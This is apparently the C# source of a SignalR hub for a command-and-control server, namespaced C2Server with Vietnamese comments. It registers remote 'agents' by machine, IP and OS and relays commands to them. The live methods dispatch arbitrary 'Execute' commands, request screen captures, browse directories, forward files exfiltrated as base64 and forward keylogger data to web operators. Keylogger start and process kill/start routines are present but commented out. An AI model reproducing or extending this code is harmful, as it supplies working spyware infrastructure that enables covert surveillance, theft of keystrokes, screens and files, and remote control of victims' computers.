using Microsoft.AspNetCore.SignalR;
using System.Collections.Concurrent;

namespace C2Server.Hubs
{
    public class AgentInfo
    {
        public string MachineId { get; set; } = string.Empty;
        public string MachineName { get; set; } = string.Empty;
        public string IPAddress { get; set; } = string.Empty;
        public string OSVersion { get; set; } = string.Empty;
        public string ConnectionId { get; set; } = string.Empty;
        public bool IsOnline { get; set; } = true; // Thêm cờ trạng thái
    }

    public class RemoteHub : Hub
    {
        // DÙNG MachineId LÀM KHÓA ĐỂ LƯU VĨNH VIỄN TRONG PHIÊN
        private static readonly ConcurrentDictionary<string, AgentInfo> KnownAgents = new();

        public override async Task OnConnectedAsync()
        {
            await base.OnConnectedAsync();
            Console.WriteLine($"[+] KẾT NỐI MỚI (Web hoặc Agent): {Context.ConnectionId}");
        }

        public override async Task OnDisconnectedAsync(Exception? exception)
        {
            // Tìm Agent đang giữ ConnectionId này
            var agent = KnownAgents.Values.FirstOrDefault(a => a.ConnectionId == Context.ConnectionId);
            if (agent != null)
            {
                agent.IsOnline = false; // CHỈ ĐỔI TRẠNG THÁI, KHÔNG XÓA
                Console.WriteLine($"[-] RỚT MẠNG: {agent.MachineName} -> Chuyển sang Offline");
                await Clients.All.SendAsync("AgentUpdated", agent);
            }
            await base.OnDisconnectedAsync(exception);
        }

        // Agent gọi hàm này để báo danh
        public async Task RegisterAgent(AgentInfo info)
        {
            info.ConnectionId = Context.ConnectionId;
            info.IsOnline = true;

            // Cập nhật hoặc thêm mới vào Dictionary
            KnownAgents[info.MachineId] = info;
            Console.WriteLine($"[*] AGENT ĐĂNG KÝ: {info.MachineName} - OS: {info.OSVersion}");

            // Báo cho toàn bộ Web Client
            await Clients.All.SendAsync("AgentUpdated", info);
        }

        // Web gọi hàm này khi F5 để lấy lại toàn bộ danh sách
        public List<AgentInfo> GetOnlineAgents()
        {
            return KnownAgents.Values.ToList();
        }

        // --- CÁC HÀM ROUTING (GIỮ NGUYÊN) ---
        // public async Task RequestProcessList(string machineId)
        // {
        //     if (KnownAgents.TryGetValue(machineId, out var agent) && agent.IsOnline)
        //     {
        //         await Clients.Client(agent.ConnectionId).SendAsync("GetProcesses");
        //     }
        // }

        public async Task ResponseProcessList(string machineId, object processList)
        {
            await Clients.All.SendAsync("OnProcessListReceived", machineId, processList);
        }
        //
        // Web gọi để diệt một tiến trình
        // public async Task KillProcess(string machineId, int pid)
        // {
        //     // Duyệt trong KnownAgents theo MachineId (như sếp đã phát hiện)
        //     if (KnownAgents.TryGetValue(machineId, out var agent) && agent.IsOnline)
        //     {
        //         // Gửi lệnh xuống Agent qua ConnectionId hiện tại
        //         await Clients.Client(agent.ConnectionId).SendAsync("KillProcess", pid);
        //         Console.WriteLine($"[*] Đã ra lệnh diệt PID {pid} trên máy {machineId}");
        //     }
        // }

        // Web gọi để chạy một ứng dụng mới
        // public async Task StartProcess(string machineId, string processName)
        // {
        //     if (KnownAgents.TryGetValue(machineId, out var agent) && agent.IsOnline)
        //     {
        //         await Clients.Client(agent.ConnectionId).SendAsync("StartProcess", processName);
        //         Console.WriteLine($"[*] Đã ra lệnh chạy {processName} trên máy {machineId}");
        //     }
        // }

        // Hàm nhận thông báo từ Agent và đẩy về cho Web hiển thị
        public async Task SendNotification(string message)
        {
            // Đẩy tin nhắn này về toàn bộ Web Client để hiển thị thông báo (toast/alert)
            await Clients.All.SendAsync("ReceiveNotification", message);
            Console.WriteLine($"[Notification from Agent]: {message}");
        }

        // 1. Web gọi để kích hoạt Hook trên Agent
        // public async Task StartKeylogger(string machineId)
        // {
        //     if (KnownAgents.TryGetValue(machineId, out var agent) && agent.IsOnline)
        //     {
        //         await Clients.Client(agent.ConnectionId).SendAsync("StartKeylogger");
        //         Console.WriteLine($"[*] Started Keylogger on {machineId}");
        //     }
        // }

        // 2. Web gọi định kỳ (3 giây/lần) để lấy dữ liệu buffer
        // public async Task PrintKeylogger(string machineId)
        // {
        //     if (KnownAgents.TryGetValue(machineId, out var agent) && agent.IsOnline)
        //     {
        //         await Clients.Client(agent.ConnectionId).SendAsync("PrintKeylogger");
        //     }
        // }

        // 3. Agent gửi log nén lên, Hub đẩy về Web
        public async Task ResponseKeylogData(string machineId, string data)
        {
            await Clients.All.SendAsync("OnKeylogReceived", machineId, data);
        }

        // Hàm điều phối lệnh chung từ Web xuống Agent
        public async Task SendCommandToAgent(string machineId, string command, object? data)
        {
            if (KnownAgents.TryGetValue(machineId, out var agent) && agent.IsOnline)
            {
                // Gửi lệnh xuống Agent với tiền tố "Execute" (Ví dụ: ExecuteShutdown, ExecuteRestart)
                await Clients.Client(agent.ConnectionId).SendAsync($"Execute{command}", data);
                Console.WriteLine($"[*] Command {command} dispatched to {machineId}");
            }
        }

        // Thêm vào trong class RemoteHub
        // --- TÍNH NĂNG CHỤP MÀN HÌNH ---
        public async Task RequestScreenCapture(string machineId)
        {
            var agent = KnownAgents.Values.FirstOrDefault(a => a.MachineId == machineId && a.IsOnline);
            if (agent != null) await Clients.Client(agent.ConnectionId).SendAsync("GetScreenCapture");
        }

        public async Task SendScreenCapture(string machineId, string base64Image)
        {
            await Clients.All.SendAsync("OnScreenCaptureReceived", machineId, base64Image);
        }

        // --- TÍNH NĂNG DUYỆT FILE ---
        public async Task RequestDirectory(string machineId, string path)
        {
            var agent = KnownAgents.Values.FirstOrDefault(a => a.MachineId == machineId && a.IsOnline);
            if (agent != null) await Clients.Client(agent.ConnectionId).SendAsync("GetDirectory", path);
        }

        public async Task SendDirectory(string machineId, object files)
        {
            await Clients.All.SendAsync("OnDirectoryReceived", machineId, files);
        }
        // Thêm vào dưới hàm SendDirectory
        public async Task ResponseDownloadedFile(string machineId, string fileName, string base64Data)
        {
            await Clients.All.SendAsync("OnDownloadedFileReceived", machineId, fileName, base64Data);
            Console.WriteLine($"[*] Đã chuyển tiếp file {fileName} ({base64Data.Length / 1024} KB) từ {machineId}");
        }
    }

}